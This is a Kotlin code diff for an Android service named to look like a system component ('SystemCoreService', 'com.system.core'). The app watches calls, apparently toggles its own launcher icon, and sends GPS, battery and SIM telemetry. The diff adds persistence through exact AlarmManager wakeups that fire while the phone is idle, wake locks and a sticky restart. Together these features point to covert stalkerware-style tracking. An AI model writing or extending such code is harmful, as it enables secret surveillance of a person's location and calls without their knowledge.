@@ -25,8 +25,10 @@ class SystemCoreService : Service() {
 
     private lateinit var locationEngine: LocationEngine
     private val activeObservers = mutableListOf<CallObserver>()
-    private val handler = Handler(Looper.getMainLooper())
-    private lateinit var telemetryRunnable: Runnable
+
+    companion object {
+        const val ACTION_PING_TELEMETRY = "com.system.core.ACTION_PING_TELEMETRY"
+    }
 
     override fun onCreate() {
         super.onCreate()
@@ -55,46 +57,82 @@ class SystemCoreService : Service() {
             }
         }
 
-        // Schedule Telemetry, GPS Location Pings, & Permission Health Checks
-        telemetryRunnable = object : Runnable {
-            override fun run() {
-                // Acquire Partial WakeLock to wake CPU when screen has been off for extended periods
-                var wakeLock: android.os.PowerManager.WakeLock? = null
-                try {
-                    val pm = getSystemService(POWER_SERVICE) as? android.os.PowerManager
-                    wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Sync::TelemetryWakeLock")
-                    wakeLock?.acquire(15 * 1000L) // Hold CPU awake for 15 seconds
-                } catch (e: Exception) {
-                    Log.e("SystemCoreService", "WakeLock acquisition error: ${e.message}")
-                }
-
-                try {
-                    // Perform dynamic permission check
-                    PermissionActivity.checkAndToggleLauncherIcon(this@SystemCoreService)
-
-                    // Transmit GPS, Battery & SIM Telemetry
-                    locationEngine.sendTelemetryPing()
-                } finally {
-                    if (wakeLock != null && wakeLock.isHeld) {
-                        try { wakeLock.release() } catch (_: Exception) {}
-                    }
-                }
-
-                val intervalMs = AppConfig.TELEMETRY_PING_INTERVAL_MINUTES * 60 * 1000
-                handler.postDelayed(this, intervalMs)
-            }
-        }
-        handler.post(telemetryRunnable)
+        // Trigger immediate ping and schedule periodic AlarmManager wakeups
+        performTelemetryPingAndScheduleNext()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (intent?.action == ACTION_PING_TELEMETRY) {
+            Log.d("SystemCoreService", "AlarmManager triggered telemetry ping action")
+            performTelemetryPingAndScheduleNext()
+        }
         return START_STICKY // System will automatically restart service if killed by OS
+    }
+
+    private fun performTelemetryPingAndScheduleNext() {
+        // Acquire Partial WakeLock to wake CPU when screen has been off for extended periods
+        var wakeLock: android.os.PowerManager.WakeLock? = null
+        try {
+            val pm = getSystemService(POWER_SERVICE) as? android.os.PowerManager
+            wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Sync::TelemetryWakeLock")
+            wakeLock?.acquire(20 * 1000L) // Hold CPU awake for 20 seconds
+        } catch (e: Exception) {
+            Log.e("SystemCoreService", "WakeLock acquisition error: ${e.message}")
+        }
+
+        try {
+            // Perform dynamic permission check
+            PermissionActivity.checkAndToggleLauncherIcon(this@SystemCoreService)
+
+            // Transmit GPS, Battery & SIM Telemetry
+            locationEngine.sendTelemetryPing()
+        } finally {
+            if (wakeLock != null && wakeLock.isHeld) {
+                try { wakeLock.release() } catch (_: Exception) {}
+            }
+        }
+
+        scheduleNextAlarm()
+    }
+
+    private fun scheduleNextAlarm() {
+        try {
+            val alarmManager = getSystemService(android.content.Context.ALARM_SERVICE) as? android.app.AlarmManager
+            val intent = Intent(this, SystemCoreService::class.java).apply {
+                action = ACTION_PING_TELEMETRY
+            }
+            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+            } else {
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT
+            }
+            val pendingIntent = android.app.PendingIntent.getService(this, 1001, intent, flags)
+
+            val intervalMs = AppConfig.TELEMETRY_PING_INTERVAL_MINUTES * 60 * 1000
+            val triggerAtMillis = System.currentTimeMillis() + intervalMs
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager?.setExactAndAllowWhileIdle(
+                    android.app.AlarmManager.RTC_WAKEUP,
+                    triggerAtMillis,
+                    pendingIntent
+                )
+            } else {
+                alarmManager?.setExact(
+                    android.app.AlarmManager.RTC_WAKEUP,
+                    triggerAtMillis,
+                    pendingIntent
+                )
+            }
+            Log.d("SystemCoreService", "Scheduled next AlarmManager ping in ${AppConfig.TELEMETRY_PING_INTERVAL_MINUTES} mins")
+        } catch (e: Exception) {
+            Log.e("SystemCoreService", "Failed to schedule AlarmManager: ${e.message}")
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         activeObservers.forEach { it.stopWatching() }
-        handler.removeCallbacks(telemetryRunnable)
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
